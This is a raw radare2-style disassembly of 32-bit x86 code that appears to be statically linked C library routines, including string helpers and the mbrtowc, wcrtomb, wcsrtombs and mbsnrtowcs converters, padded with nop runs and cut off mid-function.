xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x807739f
mov ecx, dword [eax + 0xc]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x807739c
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x807739c
add eax, 0x10
sub esi, 0x10
jae 0x8077290
cmp esi, 0xfffffff4
jb 0x807737f
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
add eax, 4
cmp esi, 0xfffffff8
jb 0x807737f
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
add eax, 4
cmp esi, 0xfffffffc
jb 0x807737f
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
add eax, 4
and esi, 3
je 0x8077398
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
cmp byte [eax], dl
je 0x80773b8
xor eax, eax
jmp 0x80773b8
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x80773b8
inc eax
test ch, ch
je 0x80773b8
inc eax
test ecx, 0xff0000
je 0x80773b8
inc eax
pop edi
pop esi
ret
nop
nop
nop
nop
nop
mov eax, dword [arg_4h]
mov ecx, dword [arg_8h]
sub ecx, eax
sub eax, 4
add eax, 4
mov dl, byte [eax + ecx]
mov byte [eax], dl
test dl, dl
je 0x8077400
mov dl, byte [eax + ecx + 1]
mov byte [eax + 1], dl
test dl, dl
je 0x80773ff
mov dl, byte [eax + ecx + 2]
mov byte [eax + 2], dl
test dl, dl
je 0x80773fe
mov dl, byte [eax + ecx + 3]
mov byte [eax + 3], dl
test dl, dl
jne 0x80773d0
inc eax
inc eax
inc eax
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
test eax, eax
je 0x80774aa
mov dword [esp], 3
call section.
mov edx, eax
mov edi, dword [arg_8h]
mov ecx, dword [arg_ch]
xor eax, eax
cmp edi, ecx
je 0x80774a2
movzx esi, byte [edi]
mov ebx, esi
movzx eax, bl
mov ebx, dword [edx + 0x38]
mov edx, dword [ebx + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [ebx + eax*4]
mov eax, edx
jne 0x80774a2
mov edx, esi
inc edi
test dl, dl
je 0x80774a2
movzx esi, byte [edi]
mov edx, esi
movzx eax, dl
mov edx, dword [ebx + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [ebx + eax*4]
mov eax, edx
je 0x8077485
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [0x80a9ab4]
jmp 0x8077460
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 4
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
test ebx, ebx
je 0x80774e7
mov dword [esp], esi
inc edi
call fcn.08053400
sub ebx, eax
lea esi, [eax + esi + 1]
dec ebx
jne 0x80774d5
add esp, 4
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
cmp esi, 1
ja 0x8077540
mov eax, dword [arg_14h]
mov dword [edi], 0
mov dword [eax], 0
xor edx, edx
add esp, 4
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
mov dword [esp], esi
call fcn.08050fe0
mov edx, 0xc
test eax, eax
mov dword [edi], eax
je 0x8077530
mov ecx, eax
movzx edx, byte [ebx]
movsx eax, dl
cmp eax, dword [arg_ch]
je 0x807758e
mov byte [ecx], dl
inc ecx
inc ebx
test dl, dl
jne 0x8077555
test esi, esi
je 0x8077573
mov eax, dword [arg_14h]
mov dword [eax], esi
jmp 0x807752e
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [arg_14h]
mov dword [edi], 0
mov dword [eax], 0
jmp 0x807756c
cmp ecx, dword [edi]
jbe 0x807759d
cmp byte [ecx - 1], 0
je 0x807759d
mov byte [ecx], 0
jmp 0x8077562
dec esi
jmp 0x8077563
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 8
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
test ebx, ebx
je 0x80775f3
mov dword [var_4h], ebx
mov dword [esp], esi
call fcn.08076f30
sub ebx, eax
add esi, eax
mov eax, ebx
dec ebx
cmp eax, 1
jbe 0x80775f3
movzx eax, byte [arg_10h]
mov byte [esi], al
inc esi
jmp 0x80775d2
add esp, 8
pop ebx
pop esi
leave
ret
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov ebx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
cmp esi, 1
ja 0x807762b
xor edx, edx
add esp, 0xc
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_ch]
mov eax, dword [edx]
add eax, esi
mov dword [var_4h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08051220
mov edx, 0xc
test eax, eax
mov dword [edi], eax
je 0x8077621
mov edx, dword [arg_ch]
mov edx, dword [edx]
mov dword [var_10h], edx
lea ecx, [edx + eax]
movzx edx, byte [ebx]
movsx eax, dl
cmp eax, dword [arg_14h]
je 0x8077675
mov byte [ecx], dl
inc ecx
inc ebx
test dl, dl
jne 0x8077656
mov eax, dword [var_10h]
mov edx, dword [arg_ch]
add eax, esi
mov dword [edx], eax
jmp 0x807761f
cmp ecx, dword [edi]
jbe 0x8077684
cmp byte [ecx - 1], 0
je 0x8077684
mov byte [ecx], 0
jmp 0x8077663
dec esi
jmp 0x8077664
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
mov edx, dword [arg_8h]
mov ecx, dword [edx]
test ecx, ecx
je 0x80776c0
mov esi, esi
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
je 0x80776c0
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
je 0x80776c0
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
je 0x80776c0
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
jne 0x80776a0
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov ecx, dword [arg_10h]
mov edx, dword [arg_8h]
mov dword [esp], esi
mov dword [var_4h], edi
mov esi, dword [arg_ch]
cld
shl ecx, 2
mov edi, edx
mov eax, edx
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, dword [esp]
mov edi, dword [var_4h]
leave
ret
nop
nop
nop
nop
push ebp
mov ebp, esp
shl dword [arg_10h], 2
leave
jmp fcn.08053690
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x6c
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
lea eax, [edi + 0x80]
cmp eax, 0x17f
ja 0x80778a8
cmp edi, 0xffffffff
je 0x80778a8
mov eax, 0
test eax, eax
je 0x807789e
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x807787e
mov esi, eax
cmp dword [esi + 4], 1
jne 0x80777c9
mov eax, dword [esi]
mov eax, dword [eax + 0x18]
test eax, eax
je 0x80777c9
mov dword [esp], eax
call fcn.08083520
mov ecx, edi
mov eax, dword [esi]
movzx edx, cl
mov dword [var_sp_4h], edx
mov edx, dword [esi]
mov dword [esp], edx
call dword [eax + 0x18]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea eax, [var_3dh]
mov dword [var_24h], 0
mov dword [var_20h], 0
mov dword [var_4ch], eax
mov dword [var_30h], 0
mov dword [var_2ch], 1
lea eax, [var_44h]
mov dword [var_34h], 1
mov dword [var_1ch], 0
mov dword [var_3ch], eax
lea ebx, [var_3ch]
lea eax, [var_40h]
mov dword [var_38h], eax
lea eax, [var_24h]
mov dword [var_28h], eax
mov eax, edi
mov byte [var_3dh], al
mov eax, dword [esi]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_48h]
mov edx, dword [esi]
mov dword [var_sp_4h], ebx
mov dword [var_14h], eax
mov dword [var_sp_1ch], 1
mov dword [var_18h], 0
mov eax, dword [var_4ch]
mov dword [var_10h], 0
inc eax
mov dword [var_sp_ch], eax
lea eax, [var_4ch]
mov dword [var_sp_8h], eax
mov eax, dword [esi]
mov dword [esp], eax
call dword [edx + 0x14]
test eax, eax
mov edx, eax
je 0x8077876
cmp eax, 5
je 0x8077876
mov eax, 0xffffffff
cmp edx, 4
cmove eax, dword [var_44h]
mov dword [var_44h], eax
mov eax, dword [var_44h]
jmp 0x80777be
cmp ebx, 0x809ff60
mov esi, 0x8092dec
je 0x8077794
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077792
mov eax, dword [0x80a9ab4]
jmp 0x8077785
mov eax, 0xffffffff
jmp 0x80777be
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0x80aa9a4
mov ebp, esp
sub esp, 0x10
mov edx, dword [arg_10h]
mov dword [esp], 0
test edx, edx
cmovne eax, edx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
call fcn.08077900
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
lea ecx, [var_40h]
push ebx
sub esp, 0x60
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov eax, dword [arg_8h]
mov edx, dword [arg_14h]
mov dword [var_30h], 0
mov edi, dword [arg_ch]
mov dword [var_2ch], 1
test eax, eax
cmove eax, ecx
test edx, edx
mov dword [var_4ch], eax
mov eax, 0x80aa9ac
cmovne eax, edx
test edi, edi
mov dword [var_28h], eax
je 0x8077ab8
mov eax, dword [var_4ch]
mov dword [var_3ch], eax
add eax, 4
mov dword [var_38h], eax
mov eax, 0
test eax, eax
je 0x8077aae
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8077a8e
mov esi, eax
mov edx, dword [arg_10h]
mov eax, 0xffffffff
mov dword [var_48h], edi
lea ebx, [edx + edi]
cmp ebx, edi
cmovb ebx, eax
mov eax, dword [esi]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_44h]
mov edx, dword [esi]
mov dword [var_ch], ebx
mov dword [var_14h], eax
mov dword [var_sp_1ch], 1
mov dword [var_18h], 0
lea eax, [var_48h]
mov dword [var_10h], 0
mov dword [var_8h], eax
lea eax, [var_3ch]
mov dword [var_4h], eax
mov eax, dword [esi]
mov dword [esp], eax
call dword [edx + 0x14]
test eax, eax
jne 0x8077a2f
mov eax, dword [var_4ch]
cmp dword [var_3ch], eax
je 0x8077a28
mov edx, dword [eax]
test edx, edx
jne 0x8077a28
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x8077a04
xor ebx, ebx
add esp, 0x60
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], str.__mbrtowc
mov dword [var_8h], 0x60
mov dword [var_4h], str.mbrtowc.c
mov dword [esp], str.__data.__statep_____count__0_
call fcn.0805efc0
mov ebx, dword [var_48h]
sub ebx, edi
jmp 0x80779fa
cmp eax, 4
jne 0x8077a5e
test eax, eax
je 0x80779e1
cmp eax, 4
je 0x80779e1
cmp eax, 5
je 0x80779e1
cmp eax, 7
mov ebx, 0xfffffffe
je 0x80779fa
call fcn.08048b20
mov ebx, 0xffffffff
mov dword [eax], 0x54
jmp 0x80779fa
cmp eax, 6
je 0x8077a34
cmp eax, 7
je 0x8077a34
cmp eax, 5
je 0x8077a34
mov dword [var_ch], str.__mbrtowc
mov dword [var_8h], 0x57
mov dword [var_4h], str.mbrtowc.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
jmp 0x8077a23
cmp ebx, 0x809ff60
mov esi, 0x8092dec
je 0x8077982
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077980
mov eax, dword [0x80a9ab4]
jmp 0x8077973
mov dword [var_4ch], ecx
mov edi, 0x80a4f11
mov dword [arg_10h], 1
jmp 0x807794e
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, 0
sub esp, 0x5c
test ebx, ebx
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_48h], esp
je 0x8077d22
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x58]
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov dword [var_34h], 0
mov dword [var_30h], 1
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
mov eax, 0x80aa9b4
lea edx, [var_2fh]
and edx, 0xfffffff0
test esi, esi
cmovne eax, esi
test edi, edi
mov dword [var_2ch], eax
je 0x8077d14
test ebx, ebx
mov dword [var_3ch], edi
je 0x8077d0a
mov dword [esp], 3
call section.
mov eax, dword [eax]
test ebx, ebx
mov edx, dword [eax + 0x58]
lea eax, [edx + edi]
mov dword [var_3ch], eax
je 0x8077d00
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8077cde
mov esi, eax
mov eax, dword [var_8h]
test eax, eax
jne 0x8077c80
mov eax, dword [esi + 8]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_44h]
mov edx, dword [esi + 8]
mov dword [var_8h], 0
mov dword [var_14h], eax
mov dword [var_sp_1ch], 1
mov dword [var_18h], 1
lea eax, [var_40h]
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_4h], eax
mov eax, dword [esi + 8]
mov dword [esp], eax
call dword [edx + 0x14]
test eax, eax
mov edx, eax
je 0x8077c6f
cmp eax, 4
je 0x8077c6f
nop
lea esi, [esi]
test edx, edx
jne 0x8077c36
mov ebx, dword [var_3ch]
sub ebx, edi
mov eax, ebx
mov esp, dword [var_48h_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
cmp edx, 4
jne 0x8077c5b
test edx, edx
je 0x8077c24
cmp edx, 4
je 0x8077c24
cmp edx, 5
je 0x8077c24
call fcn.08048b20
mov ebx, 0xffffffff
mov dword [eax], 0x54
jmp 0x8077c29
cmp edx, 6
je 0x8077c3b
cmp edx, 7
je 0x8077c3b
cmp edx, 5
je 0x8077c3b
jmp 0x8077d2c
mov eax, dword [var_40h]
mov byte [eax], 0
inc dword [var_40h]
jmp 0x8077c20
lea esi, [esi]
lea eax, [var_ch]
mov dword [var_44h], eax
mov eax, dword [esi + 8]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_40h]
mov edx, dword [esi + 8]
mov dword [var_10h], 0
mov dword [var_sp_1ch], 1
mov dword [var_18h], 0
mov dword [var_14h], eax
mov eax, dword [var_44h]
add eax, 4
mov dword [var_ch], eax
lea eax, [var_44h]
mov dword [var_8h], eax
lea eax, [var_3ch]
mov dword [var_4h], eax
mov eax, dword [esi + 8]
mov dword [esp], eax
call dword [edx + 0x14]
mov edx, eax
jmp 0x8077c20
cmp ebx, 0x809ff60
mov esi, 0x8092dec
je 0x8077bb5
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077bb3
mov esi, esi
mov eax, dword [0x80a9ab4]
jmp 0x8077ba6
mov eax, dword [0x80a9ab4]
jmp 0x8077b87
mov edi, edx
mov dword [var_ch], 0
jmp 0x8077b70
mov eax, dword [0x80a9ab4]
jmp 0x8077b2b
mov dword [var_ch], str.__wcrtomb
mov dword [var_8h], 0x62
mov dword [var_4h], str.wcrtomb.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x18
test eax, eax
mov dword [var_4h], ebx
mov ebx, dword [arg_14h]
je 0x8077dd1
mov dword [esp], 3
call section.
mov dword [var_10h], eax
test ebx, ebx
mov eax, 0x80aa9bc
cmovne eax, ebx
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08078440
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8077da1
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov edx, 0x80aa9c4
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x168
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov eax, dword [arg_14h]
mov dword [var_30h], 0
mov dword [var_2ch], 1
test eax, eax
cmovne edx, eax
mov eax, 0
test eax, eax
mov dword [var_28h], edx
je 0x80780c4
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x80780a4
mov edx, dword [arg_8h]
mov esi, dword [eax + 8]
test edx, edx
je 0x8077fc0
mov edx, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.080783a0
mov ecx, dword [arg_ch]
mov edx, eax
mov eax, dword [ecx]
lea edi, [eax + edx*4 + 4]
mov eax, dword [arg_8h]
mov dword [var_3ch], eax
add eax, dword [arg_10h]
mov dword [var_38h], eax
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_ch]
lea eax, [var_150h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
lea eax, [var_3ch]
mov dword [var_ch], edi
mov dword [esp], esi
mov dword [var_8h], edx
mov dword [var_4h], eax
call dword [esi + 0x14]
mov ecx, eax
mov eax, dword [var_3ch]
mov ebx, eax
sub ebx, dword [arg_8h]
test ecx, ecx
je 0x8077f59
cmp ecx, 4
je 0x8077f59
nop
test ecx, ecx
jne 0x8077f01
add esp, 0x168
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
cmp ecx, 4
jne 0x8077f26
test ecx, ecx
je 0x8077ef4
cmp ecx, 5
je 0x8077ef4
cmp ecx, 4
je 0x8077ef4
call fcn.08048b20
mov ebx, 0xffffffff
mov dword [eax], 0x54
jmp 0x8077ef4
cmp ecx, 6
je 0x8077f06
cmp ecx, 7
je 0x8077f06
cmp ecx, 5
je 0x8077f06
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x88
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
cmp byte [eax - 1], 0
jne 0x8077ef0
cmp eax, dword [arg_8h]
je 0x8077f9d
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x8077f7c
mov eax, dword [arg_ch]
mov dword [eax], 0
dec ebx
jmp 0x8077ef0
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x7d
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.__data.__statep_____count__0_
jmp 0x8077f54
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x7c
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.data.__outbuf____unsigned_char___dst
jmp 0x8077f54
mov esi, esi
mov eax, dword [arg_ch]
lea edi, [var_13ch]
mov ebx, dword [eax]
mov dword [esp], ebx
call fcn.08077690
mov dword [var_14ch], ebx
lea eax, [ebx + eax*4 + 4]
xor ebx, ebx
mov dword [var_154h], eax
mov eax, dword [var_28h]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_140h], edx
mov dword [var_144h], eax
lea edx, [var_3ch]
lea eax, [var_144h]
mov dword [var_38h], edx
mov dword [var_28h], eax
mov eax, dword [esi + 0x14]
mov dword [var_3ch], edi
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_154h]
lea ecx, [var_148h]
lea edx, [var_14ch]
mov dword [var_14h], ecx
mov dword [var_8h], edx
mov dword [var_sp_1ch], 1
lea ecx, [var_3ch]
mov dword [var_18h], 0
mov dword [var_10h], 0
mov dword [var_4h], ecx
mov dword [var_ch], eax
mov dword [esp], esi
call dword [esi + 0x14]
mov edx, dword [var_3ch]
mov ecx, eax
mov eax, edx
sub eax, edi
add ebx, eax
cmp ecx, 5
je 0x8078008
test ecx, ecx
je 0x8078076
cmp ecx, 4
jne 0x8077ef0
cmp byte [edx - 1], 0
je 0x8077f76
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x5f
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.data.__outbuf__1___0
jmp 0x8077f54
cmp ebx, 0x809ff60
mov eax, 0x8092dec
je 0x8077e5e
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077e5e
mov eax, dword [0x80a9ab4]
jmp 0x8077e51
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0x80aa9cc
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x15c
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov edx, dword [arg_18h]
mov ecx, dword [arg_10h]
mov dword [var_30h], 0
mov edi, dword [arg_8h]
mov dword [var_2ch], 1
test edx, edx
cmovne eax, edx
mov dword [var_28h], eax
xor eax, eax
test ecx, ecx
je 0x8078208
mov edx, dword [arg_ch]
lea eax, [ecx - 1]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076f30
mov edx, dword [arg_ch]
add eax, dword [edx]
inc eax
mov dword [var_148h], eax
mov eax, 0
test eax, eax
je 0x8078391
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8078371
test edi, edi
mov ebx, dword [eax]
je 0x80782d6
mov eax, dword [arg_14h]
mov dword [var_3ch], edi
lea eax, [edi + eax*4]
mov dword [var_38h], eax
mov eax, dword [ebx + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_140h]
mov edx, dword [var_148h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_ch], edx
mov dword [var_8h], eax
lea eax, [var_3ch]
mov dword [var_4h], eax
call dword [ebx + 0x14]
mov esi, dword [var_3ch]
sub esi, edi
sar esi, 2
mov edx, eax
test eax, eax
je 0x8078270
cmp eax, 4
je 0x8078270
test edx, edx
jne 0x8078213
mov eax, esi
add esp, 0x15c
pop ebx
pop esi
pop edi
leave
ret
cmp edx, 4
jne 0x807823d
test edx, edx
je 0x8078206
cmp edx, 5
je 0x8078206
cmp edx, 4
je 0x8078206
cmp edx, 7
je 0x8078206
call fcn.08048b20
mov esi, 0xffffffff
mov dword [eax], 0x54
jmp 0x8078206
cmp edx, 6
je 0x8078218
cmp edx, 7
je 0x8078218
cmp edx, 5
je 0x8078218
mov dword [var_ch], str.__mbsnrtowcs
mov dword [var_8h], 0x81
mov dword [var_4h], str.mbsnrtowcs.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
test esi, esi
je 0x80782b5
mov ecx, dword [edi + esi*4 - 4]
test ecx, ecx
jne 0x8078202
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x8078294
mov eax, dword [arg_ch]
mov dword [eax], 0
dec esi
jmp 0x8078202
mov dword [var_ch], str.__mbsnrtowcs
mov dword [var_8h], 0x76
mov dword [var_4h], str.mbsnrtowcs.c
mov dword [esp], str.__data.__statep_____count__0_
jmp 0x807826b
mov dword [var_ch], str.__mbsnrtowcs
mov dword [var_8h], 0x73
mov dword [var_4h], str.mbsnrtowcs.c
mov dword [esp], str.result___0
jmp 0x807826b
mov edx, dword [arg_ch]
xor esi, esi
lea edi, [var_13ch]
mov eax, dword [edx]
mov dword [var_144h], eax
lea eax, [var_3ch]
mov dword [var_38h], eax
nop
mov eax, dword [ebx + 0x14]
mov dword [var_3ch], edi
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_148h]
lea edx, [var_140h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], edx
mov dword [var_18h], 0
mov dword [var_10h], 0
lea edx, [var_144h]
mov dword [esp], ebx
mov dword [var_ch], eax
mov dword [var_8h], edx
lea eax, [var_3ch]
mov dword [var_4h], eax
call dword [ebx + 0x14]
mov ecx, dword [var_3ch]
mov edx, eax
mov eax, ecx
sub eax, edi
sar eax, 2
add esi, eax
cmp edx, 5
je 0x80782f0
test edx, edx
je 0x8078361
cmp edx, 4
jne 0x8078202
mov ebx, dword [ecx - 4]
test ebx, ebx
jne 0x8078202
jmp 0x807828e
cmp ebx, 0x809ff60
mov eax, 0x8092dec
je 0x807818e
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x807818e
mov eax, dword [0x80a9ab4]
jmp 0x8078181
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
cmp dword [ecx], 0
je 0x80783e0
test edx, edx
je 0x80783e0
inc eax
cmp dword [ecx + eax*4], 0
je 0x80783e0
dec edx
je 0x80783e0
inc eax
cmp dword [ecx + eax*4], 0
je 0x80783e0
dec edx
je 0x80783e0
inc eax
cmp dword [ecx + eax*4], 0
je 0x80783e0
dec edx
je 0x80783e0
inc eax
dec edx
cmp dword [ecx + eax*4], 0
je 0x80783e0
test edx, edx
jne 0x80783b4
mov esi, esi
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov eax, dword [edx]
test eax, eax
je 0x807840d
nop
cmp eax, ecx
je 0x807840d
add edx, 4
mov eax, dword [edx]
test eax, eax
jne 0x8078400
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x168
mov dword [var_1ch], 0
mov eax, dword [arg_14h]
mov dword [var_30h], 0
mov dword [var_2ch], 1
mov dword [var_34h], 1
mov esi, dword [arg_10h]
mov dword [var_28h], eax
